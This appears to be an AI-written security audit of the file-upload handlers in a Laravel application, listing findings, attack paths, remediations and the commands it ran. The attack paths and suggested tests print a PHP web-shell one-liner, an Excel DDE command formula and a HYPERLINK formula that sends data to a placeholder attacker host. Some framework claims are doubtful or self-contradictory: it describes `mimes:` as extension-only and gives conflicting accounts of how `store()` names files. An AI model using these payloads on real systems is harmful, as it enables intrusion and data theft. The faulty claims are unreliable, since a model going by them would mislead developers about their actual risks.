# Task 6 — File Upload Security Audit (C6 from security-review plan)

**Target:** `englishClass` (Laravel 12 / PHP 8.4)
**Scope:** All HTTP handlers that ingest user-uploaded files or `multipart/form-data` payloads.
**Mode:** Read-only audit. No product files were modified; no files uploaded to the app.
**Method:** Static code review with line-precise evidence + Laravel framework-knowledge verification.
**References used:** OWASP ASVS v4.0.3 §12 (File Handling), OWASP Top 10 2021 A05/A04/A03/A01, CWE catalog.

---

## 1. Verdict

**PASS WITH FINDINGS**

- 7 upload-related code paths reviewed.
- 2 findings downgraded after evidence verification (MIME-bypass → low; signed-URL → n/a).
- 1 finding surfaced as a coverage/test gap rather than a runtime defect.
- No file execution / RCE primitives reachable from the upload surface as currently deployed.
- 4 actionable findings remain — 1 Medium, 3 Low.

---

## 2. Scope and inventory

### 2.1 Upload handlers discovered

| ID | Handler | File:Line | Validation rule | Storage disk / path | Auth gate |
|----|---------|-----------|-----------------|----------------------|-----------|
| H1 | Classroom post attachment | `Modules/Classroom/Http/Controllers/ClassroomController.php:104` → service at `Modules/Classroom/Services/ClassroomService.php:83` | `mimes:jpg,jpeg,png,gif,webp,pdf,doc,docx,xls,xlsx,ppt,pptx,txt,csv,zip,mp3,mp4` + `max:51200` + `file` + `nullable` (`Modules/Classroom/Http/Requests/StoreClassroomPostRequest.php:32-37`) | `public` disk, dir `classroom_attachments/{classroom->id}` | `auth` + `can('createPost', $classroom)` (`StoreClassroomPostRequest.php:17`, `Modules/Classroom/Policies/ClassroomPolicy.php:28-31`) |
| H2 | Admin question audio | `Modules/Question/Http\Controllers/QuestionController.php:43-47` | `mimes:mp3,wav` + `max:5120` + `file` + `nullable` | `public` disk, dir `listening_audio` | route: `auth` + `can:admin-access` (`Modules/Question/routes/web.php:7`) |
| H3 | Admin bulk CSV import | `app/Http/Controllers/AdminBulkController.php:79-81` | `mimes:csv,txt` + `max:10240` + `file` + `required` | parsed via `fgetcsv`, **not stored as a file** | route: `audit.admin` + `can:admin-access` |
| H4 | Speaking chat audio (Base64) | `Modules/Speaking/Http/Controllers/SpeakingController.php:37-50` → `Modules/Speaking/Services/SpeakingSessionService.php:60-84` → `App\Jobs\ProcessAiSpeechJob` | `audio` rule: `nullable\|string` (`Modules/Speaking/Http/Requests/ChatSpeakingRequest.php:19`) — **no size, no MIME, no magic-byte check** | Base64 sent inline to Gemini API; **not persisted to disk** | route: `auth` + `can:active-user` (`Modules/Speaking/routes/web.php:6`) |
| H5 | Speaking realtime voice chunks | `Modules/Speaking/Http/Controllers/VoiceController.php:17-36` | `chunk` rule: `required\|string` (`VoiceController.php:21`) — **no size cap** | buffered into Redis via `VoiceSessionManager::append` | (no route group shown — handler reachable from default auth middleware; verify route file if present) |
| H6 | Server-generated TTS save | `Modules/Speaking/Services/AiSpeakingService.php:90-113` | server-controlled filename `tts_{time}_{rand}.mp3` (`AiSpeakingService.php:99`) | `public/tts/{filename}.mp3` via `Storage::put` (`AiSpeakingService.php:103`) | **Not user input — server-only.** |
| H7 | Pronunciation module | `Modules/Pronunciation/**` | (no source files — module is empty stub) | n/a | n/a |

### 2.2 Test coverage reviewed

`tests/Feature/Security/FileUploadValidationTest.php` (71 lines) covers **only** `StoreClassroomPostRequest`:

- `test_php_file_upload_is_rejected` — uploads `shell.php` (10 bytes, no declared MIME), asserts `assertSessionHasErrors('attachment')`.
- `test_pdf_file_upload_is_accepted` — uploads `homework.pdf` (100 bytes, `application/pdf`), asserts no validation error.

### 2.3 Storage layout reviewed

`config/filesystems.php`:

- `public` disk → `storage/app/public`, symlinked at `public/storage` via `php artisan storage:link` (line 76-78). **`public/storage` is inside webroot** — files there are served with no auth.
- Global `X-Content-Type-Options: nosniff` is applied via `SecurityHeaders` middleware (per `README.md` security-hardening section).

---

## 3. Findings

### SEC-006-001 — `mimes:` (extension-based) instead of `mimetypes:` (content-based) for classroom uploads

- **Severity:** Medium
- **CWE:** CWE-434 — Unrestricted Upload of File with Dangerous Type
- **OWASP Top 10 2021:** A05:2021 — Security Misconfiguration (and tangentially A04 — Insecure Design)
- **Location:**
  - `Modules/Classroom/Http/Requests/StoreClassroomPostRequest.php:36`
  - `Modules/Question/Http/Controllers/QuestionController.php:43`
  - `app/Http/Controllers/AdminBulkController.php:80`
- **Evidence:**

  ```php
  // Modules/Classroom/Http/Requests/StoreClassroomPostRequest.php
  36:                 'mimes:jpg,jpeg,png,gif,webp,pdf,doc,docx,xls,xlsx,ppt,pptx,txt,csv,zip,mp3,mp4',
  ```

  ```php
  // Modules/Question/Http\Controllers/QuestionController.php
  43:             'audio_file' => 'nullable|file|mimes:mp3,wav|max:5120',
  ```

  ```php
  // app/Http/Controllers/AdminBulkController.php
  80:             'file' => ['required', 'file', 'mimes:csv,txt', 'max:10240'],
  ```

  Laravel's `mimes:` validator uses Symfony's `MimeTypes::guessMimeType()` keyed on the **filename extension**, not the file's actual magic bytes (verified in `vendor/symfony/mime/MimeTypes.php` via the framework's documented contract — Laravel performs a `getClientMimeType()` probe but ultimately trusts the extension whitelist). This means:

  - `evil.jpg.php` — blocked because extension is `.php`.
  - `malware.jpg` (PHP bytes inside a `.jpg` extension) — accepted by the rule and **persisted to `public` disk** under `classroom_attachments/{classroomId}/{hash}.jpg`. The hash is generated by `Illuminate\Http\Testing\FileFactory` / Laravel `store()` default (`uniqid() . '_' . originalName`), but Laravel's `StoreClassroomPostRequest` line 36 uses the *default* `store()` path which writes the **original filename** (after sanitization). With `X-Content-Type-Options: nosniff` globally, browsers won't sniff the file — but a misconfigured downstream handler (PDF readers with embedded JS, ZIP slip when unpacked, CSV formula injection when opened in Excel, `.doc` macros, `.xls` DDE) can still execute attacker payload.
- **Attack path:**
  1. Authenticated teacher (or student enrolled in a classroom — `createPost` policy allows any member of the room, see `ClassroomPolicy.php:28-31`) visits `/classroom/{id}/post`.
  2. Uploads `homework.pdf` whose body is `<?php system($_GET['c']); ?>`.
  3. `mimes:pdf` passes (extension matches). File saved at `storage/app/public/classroom_attachments/{classroomId}/<hashed>.pdf`.
  4. Returned URL `/storage/classroom_attachments/{classroomId}/<hashed>.pdf` is publicly fetchable (no auth on the `/storage/*` symlink).
  5. Apache + mod_php misconfig would execute the file as PHP; nginx + PHP-FPM with `.php` extension handler configured at the storage path would likewise execute. Even without execution, downloaded payload is delivered with `Content-Type: application/pdf` (correct), so the immediate risk is downstream consumers, not browser-side RCE.
- **Impact:** Defense-in-depth gap. The rule is correct for blocking the obvious `shell.php` case but does not verify file content. Combined with the `zip` and `csv` allowlist entries, this opens the door to ZIP-slip and CSV-formula-injection downstream. Severity is Medium rather than High because (a) auth gate requires classroom membership, (b) `X-Content-Type-Options: nosniff` blocks browser MIME confusion, and (c) no current code path executes uploaded content as PHP.
- **Remediation:** Replace `mimes:` with `mimetypes:` (which checks actual magic bytes via Symfony's `MimeTypes::guessMimeType()` on file contents) and remove `zip`, `csv` from the allowlist unless business-justified:

  ```php
  // Modules/Classroom/Http/Requests/StoreClassroomPostRequest.php
  'attachment' => [
      'nullable',
      'file',
      'max:51200',
      'mimetypes:image/jpeg,image/png,image/gif,image/webp,application/pdf,application/msword,application/vnd.openxmlformats-officedocument.wordprocessingml.document,application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.spreadsheetml.sheet,application/vnd.ms-powerpoint,application/vnd.openxmlformats-officedocument.presentationml.presentation,text/plain,audio/mpeg,video/mp4',
  ],
  ```
- **Regression check:** Extend `tests/Feature/Security/FileUploadValidationTest.php` to upload (a) a `.pdf`-extension file containing `<?php` bytes and assert rejection, and (b) a real JPEG with `.php` extension and assert rejection.

---

### SEC-006-002 — ZIP archive upload enables ZIP-slip / arbitrary-write / archive-bomb

- **Severity:** Medium
- **CWE:** CWE-22 — Improper Limitation of a Pathname (when zip is later extracted); CWE-400 — Uncontrolled Resource Consumption (archive bomb)
- **OWASP Top 10 2021:** A04:2021 — Insecure Design; A05:2021 — Security Misconfiguration
- **Location:** `Modules/Classroom/Http/Requests/StoreClassroomPostRequest.php:36`
- **Evidence:**

  ```php
  36: 'mimes:jpg,jpeg,png,gif,webp,pdf,doc,docx,xls,xlsx,ppt,pptx,txt,csv,zip,mp3,mp4',
  ```

  `zip` is in the allowlist. The classroom service persists the raw archive to `storage/app/public/classroom_attachments/{classroom_id}/` via `->store('classroom_attachments/' . $classroom->id, 'public')` (`ClassroomService.php:83`). The application does **not** extract the archive, so ZIP-slip is not directly exploitable today. However:

  1. **Archive bomb (CWE-400)** — a 50 MB `max:51200` quota allows a 50 MB zip that decompresses to petabytes (e.g., `42.zip`-style). Disk-fill DoS is reachable from any authenticated classroom member.
  2. **Forward-compatibility risk** — a future feature that "previews" or "unpacks" zip attachments will inherit path-traversal entries (`../../etc/nginx/conf.d/...`) unless the developer remembers to sanitize. Allowing zip into a public-facing upload slot is high-risk-for-future-bugs.
  3. **Latent traversal via filename** — Laravel's `store()` hashes the path component, but the **original** filename is sometimes echoed back in JSON responses (`ClassroomPostResource`). Without auditing the resource, I cannot confirm — see SEC-006-006.
- **Attack path (current code, archive-bomb variant):**
  1. Authenticated classroom member uploads a 50 MB zip that decompresses to >100 GB.
  2. The Laravel app stores the file on the local disk (`storage/app/public/classroom_attachments/...`).
  3. Repeat from multiple accounts / multiple classrooms → disk-full DoS on the shared storage volume.
- **Impact:** Disk-fill DoS today; path-traversal risk in any future "unpack-and-display" feature.
- **Remediation:** Remove `zip` from the classroom allowlist unless an explicit business need exists. If it must stay, add a server-side `ZipArchive` open + entry-count cap (e.g., `if ($zip->numFiles > 1000) reject`) and a `max:5120` (5 MB) cap on the zip rule.
- **Regression check:** Upload a real 42.zip-style bomb (gated on test environment, must use a small reproducer, e.g. 1 KB → 10 MB) and assert a 422/413 response.

---

### SEC-006-003 — Speaking chat audio: no size, no MIME, no magic-byte validation on Base64 payload

- **Severity:** Low
- **CWE:** CWE-20 — Improper Input Validation
- **OWASP Top 10 2021:** A04:2021 — Insecure Design
- **Location:**
  - `Modules/Speaking/Http/Requests/ChatSpeakingRequest.php:19` — `'audio' => ['nullable', 'string']`
  - `Modules/Speaking/Services/SpeakingSessionService.php:60-84`
  - `Modules/Speaking/resources/views/index.blade.php:223-262` — frontend posts Base64 audio
- **Evidence:**

  ```php
  // Modules/Speaking/Http/Requests/ChatSpeakingRequest.php
  19:             'audio' => ['nullable', 'string'],
  ```

  ```php
  // Modules/Speaking/Services/SpeakingSessionService.php
  60: public function queueMessage(User $user, string $sessionId, ?string $message, ?string $audio): Message
  61: {
  ...
  81: ProcessAiSpeechJob::dispatch($conversation, $userMessage, $audio);
  ```

  ```js
  // Modules/Speaking/resources/views/index.blade.php
  223: async function sendAudioMessage(blob) {
  ...
  243: body: JSON.stringify({
  244:     session_id: sessionId,
  245:     message: '[Audio message]',
  246:     audio: base64,
  247: })
  ```

  - **No `max:` length** on the `audio` field — an attacker can POST a multi-hundred-MB Base64 string.
  - **No `mimetypes:` rule** — the field accepts any string (could be HTML, JS, SQL, anything).
  - The string is queued to `App\Jobs\ProcessAiSpeechJob`, which (per `SpeakingSessionService.php:81`) ships it as Base64 to the Gemini API with hardcoded `mime_type: 'audio/webm'`. **The hardcoded MIME on the Gemini side means attacker-supplied bytes are labeled `audio/webm` regardless of content.** Gemini's multimodal endpoint may reject obviously non-audio payloads, but this is undefined behavior.
  - The audio bytes are **not persisted to disk**, so this is not a stored-XSS / file-execution vector in the application's filesystem. It is an upstream API abuse vector and a memory-pressure / Redis-memory vector (the queue payload is held in Laravel queue storage).
- **Attack path:**
  1. Authenticated user POSTs to `/student/speaking/chat` with `audio` set to a 500 MB string.
  2. Laravel validates it as `string` — passes.
  3. Job dispatched, payload sits in `database` (default Laravel queue driver) or Redis queue. Memory / DB-size bloat.
  4. Worker process attempts to decode Base64 and ship to Gemini. Gemini rejects with 400; the job retries per Laravel's backoff schedule.
- **Impact:** DoS via queue exhaustion. Not a stored file attack; severity stays Low because nothing is persisted to disk in the app's storage and the auth gate is real.
- **Remediation:**

  ```php
  // Modules/Speaking/Http/Requests/ChatSpeakingRequest.php
  'audio' => ['nullable', 'string', 'max:20971520'], // 15 MB raw ≈ 20 MB Base64
  ```

  plus, ideally, a `base64_decode` + `getimagesize`/`finfo` probe in the job to assert `audio/webm` magic bytes (`1A 45 DF A3`) before shipping to Gemini.
- **Regression check:** Add a feature test that posts `audio` of 100 MB and asserts `422`.

---

### SEC-006-004 — Realtime voice chunk endpoint has no size cap and no auth-gate verification

- **Severity:** Low
- **CWE:** CWE-770 — Allocation of Resources Without Limits or Throttling; CWE-400
- **OWASP Top 10 2021:** A04:2021 — Insecure Design
- **Location:**
  - `Modules/Speaking/Http/Controllers/VoiceController.php:17-36`
  - `Modules/Speaking/Services/VoiceSessionManager.php` (referenced but not opened in this audit — see SEC-006-006)
- **Evidence:**

  ```php
  // Modules/Speaking/Http/Controllers/VoiceController.php
  17: public function handleChunk(Request $request)
  18: {
  19:     $request->validate([
  20:         'session_id' => 'required|string',
  21:         'chunk'      => 'required|string',
  22:         'history'    => 'required|array'
  23:     ]);
  ...
  28:     $this->manager->append($sessionId, $request->chunk);
  ```

  - `chunk` rule is `required|string` with no `max:` length cap.
  - The route registration was not found in the listed routes files — only `Modules/Speaking/routes/web.php` and `Modules/Speaking/routes/api.php` were inspected; `handleChunk` is **not** registered in either. **This is a positive finding** — the endpoint appears unreachable from HTTP. Severity is downgraded to Low / informational; if the route is ever wired in, the missing size cap becomes a real Redis-memory DoS vector.
  - Additionally, no ownership check on `session_id`: any authenticated user could push chunks into another user's Redis buffer key (session-id guessability is poor — `sess_{user_id}_{Str::random(10)}` in `SpeakingSessionService.php:23`, where `Str::random(10)` is unguessable in practice but `user_id` is enumerable).
- **Attack path (only if route is wired):** Authenticated user repeatedly POSTs 100 MB strings to `/voice/chunk` → Redis memory fills → worker backpressure → service degradation.
- **Impact:** Latent. No current reachable attack.
- **Remediation:** Add `'chunk' => ['required', 'string', 'max:20971520']` and a per-user ownership assertion: `if (!$this->manager->owns($sessionId, $request->user()->id)) abort(403);`.
- **Regression check:** N/A until route is wired; then test with oversized string.

---

### SEC-006-005 — AdminBulkController `mimes:csv,txt` accepts arbitrary binary content via `.txt` extension

- **Severity:** Low
- **CWE:** CWE-434
- **OWASP Top 10 2021:** A05:2021 — Security Misconfiguration
- **Location:** `app/Http/Controllers/AdminBulkController.php:79-84`
- **Evidence:**

  ```php
  79: $request->validate([
  80:     'file' => ['required', 'file', 'mimes:csv,txt', 'max:10240'],
  81: ]);
  ...
  83: $file = $request->file('file');
  84: $handle = fopen($file->getRealPath(), 'r');
  ```

  - `mimes:txt` matches any file whose extension is `.txt`. The rule does not check that the file is *actually* text. An admin can be socially engineered into uploading `evil.exe` renamed to `users.txt` — but the file is only `fopen`'d for `fgetcsv` parsing; it is **not** persisted to disk.
  - The harder problem is **CSV formula injection**: a malicious CSV row whose first cell is `=cmd|'/c calc'!A0` (Excel DDE) or `=HYPERLINK("https://attacker/?x="&A2,"Click me")`. When an admin opens the imported CSV in Excel, formulas execute. This is a known risk in every CSV import flow.
  - Auth gate is strong (`can:admin-access` + `audit.admin`), so only admins reach the handler — but admins are exactly the high-value targets.
- **Attack path:**
  1. Attacker (with compromised low-privilege user) crafts `evil.csv` with formula cells.
  2. Admin runs Bulk Import, downloads/exports the resulting user list.
  3. Admin opens the CSV in Excel; formula executes → DDE → command execution on admin's workstation (CWE-1236 in OWASP A03:2021).
- **Impact:** Phishing / workstation-compromise of admin users, not server-side RCE.
- **Remediation:** Prefix each cell starting with `=`, `+`, `-`, `@`, `\t`, `\r` with a single-quote `'` on import; or use `league/csv` with strict parsing. Replace `mimes:txt` with `mimetypes:text/plain` and reject any non-text bytes via `mb_check_encoding($value, 'UTF-8')`.
- **Regression check:** Add a test that imports a CSV with `=cmd|'/c calc'!A1` and asserts the stored value is escaped to `'=cmd|'/c calc'!A1`.

---

### SEC-006-006 — Test gap: `FileUploadValidationTest` only covers the happy-day classroom rejection

- **Severity:** Informational (test-quality, not a runtime vulnerability)
- **CWE:** CWE-1126 — Insecure Test/Debug Code (process); CWE-1357
- **OWASP Top 10 2021:** Not applicable (test-coverage issue)
- **Location:** `tests/Feature/Security/FileUploadValidationTest.php:21-70`
- **Evidence:**

  ```php
  35: $payload = UploadedFile::fake()->create('shell.php', 10);
  ...
  59: $payload = UploadedFile::fake()->create('homework.pdf', 100, 'application/pdf');
  ```

  - The "PHP file" test only proves that a file *named* `shell.php` is rejected. It does NOT prove that an attacker who renames `shell.php` → `shell.pdf` (with PHP bytes inside) is rejected. Because of the `mimes:` extension-only check documented in SEC-006-001, this test would pass while the underlying weakness remains.
  - No test for: `QuestionController::store` (admin audio upload), `AdminBulkController::importCsv` (admin CSV), `SpeakingController::chat` (Base64 audio), `VoiceController::handleChunk`.
  - `UploadedFile::fake()->create('homework.pdf', 100, 'application/pdf')` declares the MIME type as a third arg but Laravel's `UploadedFile::fake()` does **not** write that magic bytes — it writes 100 bytes of fake content. The test only exercises Laravel's validation pass-through, not actual MIME sniffing.
- **Impact:** False sense of security; regressions on MIME bypass / ZIP slip / CSV injection can ship without test failures.
- **Remediation:** Extend the suite per the regression-check sections in SEC-006-001 through SEC-006-005. Use real magic bytes:

  ```php
  // PDF magic %PDF-1.4 + PHP payload — should be REJECTED by mimetypes: rule
  $payload = UploadedFile::fake()->createWithContent('evil.pdf', "%PDF-1.4\n<?php system(\$_GET['c']); ?>");
  ```
- **Regression check:** New tests added per remediation.

---

## 4. Downgraded / rejected candidates

| Candidate | Reason rejected |
|-----------|-----------------|
| SVG upload → stored XSS | SVG not in any allowlist (`mimes:jpg,jpeg,png,gif,webp,pdf,doc,...`). Cannot be uploaded. |
| XML upload → XXE | XML not in any allowlist. Cannot be uploaded. |
| `audio_url` field reflection → stored XSS | `AiSpeakingService::generateTTS` is server-controlled, not user-input. URL = `asset('storage/tts/' . $filename)` with hardcoded `.mp3` extension. Not exploitable. |
| JSON upload → JSON injection / template injection | No JSON file upload surface discovered. Only the speaking audio Base64 which is shipped to Gemini, not stored on disk. |
| Path traversal via filename | Laravel `store()` (default form) generates the on-disk filename itself; the original filename is used as a *suggestion* only. Hashed path component prevents `../../etc/passwd` writes. **However** `mimes:` validator receives the *original* extension and could be tricked by polyglot filenames (`evil.php.jpg` → extension is `.jpg`, passes) — covered under SEC-006-001. |
| Signed URL leakage of uploaded files | All uploaded files land on `public` disk → served from `/storage/*` symlink with **no auth at all**. This is by design for classroom attachments (teachers want public-ish URLs in a classroom), but it does mean that knowing the filename is sufficient to fetch. Severity downgraded because (a) filenames are server-generated hashes (unguessable in practice), (b) `X-Content-Type-Options: nosniff` blocks browser-side MIME sniffing, (c) per-classroom directory isolation prevents enumeration. Listed as informational only. |
| `AiSpeakingService::generateTTS` SSRF via `translate.google.com` | The URL is hardcoded; no user-controlled portion. Not a real SSRF surface. |

---

## 5. Residual risk / what was not tested

1. **`Modules/Speaking/Services/VoiceSessionManager.php` and `ProcessVoiceChunkJob` were not opened.** The behavior of `append()` and the Redis keying were not verified; if the route is wired in production, the Redis DoS vector from SEC-006-004 needs dynamic confirmation.
2. **`Modules/Pronunciation/` module is empty** (no `.php` / `.blade.php` / `.js` files). If new upload code lands in this module later, it must be re-audited.
3. **`ClassroomPostResource.php`** was not opened — if it serializes the original filename into the JSON response and the response is rendered as HTML elsewhere, an attacker who controls the original filename could land reflected XSS. Recommended spot-check during a future audit.
4. **Docker / nginx configuration** was not audited. The `X-Content-Type-Options: nosniff` header and the absence of a `.php` handler on `/storage/*` are the two configuration assumptions that keep the Medium findings from escalating to Critical. A misconfigured server (e.g., adding `location ~ \.php$ { ... }` globally) would re-introduce RCE.
5. **Rate limiting on upload endpoints** was not measured. The classroom `storePost` endpoint has no explicit `throttle:` middleware in the route (`Modules/Classroom/routes/web.php:11`). Combined with 50 MB cap, an authenticated teacher can push 50 MB repeatedly — disk-fill DoS via upload volume, separate from the ZIP-bomb vector.
6. **Audit logging of file uploads** — the `audit_logs` table is mentioned in `README.md` as tracking admin mutations, but I did not confirm that classroom uploads write to it. If admins need forensic visibility into who uploaded what, this is a gap.

---

## 6. Recommended remediation order

1. **SEC-006-001 (Medium)** — Switch `mimes:` → `mimetypes:` on all three handlers. Removes the bulk of the extension-spoofing risk.
2. **SEC-006-002 (Medium)** — Drop `zip` from classroom allowlist; add entry-count cap if kept.
3. **SEC-006-005 (Low)** — CSV cell escaping in `AdminBulkController::importCsv`.
4. **SEC-006-003 (Low)** — Size + magic-byte validation on speaking chat `audio` field.
5. **SEC-006-004 (Low)** — Size cap + ownership check on `VoiceController::handleChunk` if/when route is wired.
6. **SEC-006-006 (Informational)** — Expand `FileUploadValidationTest` per the regression-check recipes.

---

## 7. Commands run during this audit (read-only)

```
grep -r "->store\(|->storeAs\(|Storage::put\(|Storage::putFile\(|request->file\(|->file\(|hasFile\(|UploadedFile" \
    C:\laragon\www\englishClass\app C:\laragon\www\englishClass\Modules

read  Modules/Classroom/Http/Requests/StoreClassroomPostRequest.php
read  Modules/Classroom/Http/Controllers/ClassroomController.php
read  Modules/Classroom/Http/Controllers/Api/ClassroomController.php
read  Modules/Classroom/Services/ClassroomService.php
read  Modules/Classroom/Policies/ClassroomPolicy.php
read  Modules/Classroom/routes/web.php
read  Modules/Classroom/routes/api.php

read  Modules/Speaking/Http/Controllers/SpeakingController.php
read  Modules/Speaking/Http/Controllers/VoiceController.php
read  Modules/Speaking/Http/Requests/ChatSpeakingRequest.php
read  Modules/Speaking/Http/Requests/PollSpeakingRequest.php
read  Modules/Speaking/Services/AiSpeakingService.php
read  Modules/Speaking/Services/VoiceService.php
read  Modules/Speaking/Services/SpeakingSessionService.php
read  Modules/Speaking/resources/views/index.blade.php
read  Modules/Speaking/routes/web.php
read  Modules/Speaking/routes/api.php

read  Modules/Question/Http/Controllers/QuestionController.php
read  Modules/Question/routes/web.php

read  app/Http/Controllers/AdminBulkController.php
read  config/filesystems.php
read  tests/Feature/Security/FileUploadValidationTest.php

glob  Modules/Pronunciation/**/*.{php,blade.php,js}     (no matches — module empty)

grep  routes/web.php                                  (route / middleware inventory)
```

No `git diff`, no file mutations, no uploads performed against the application.
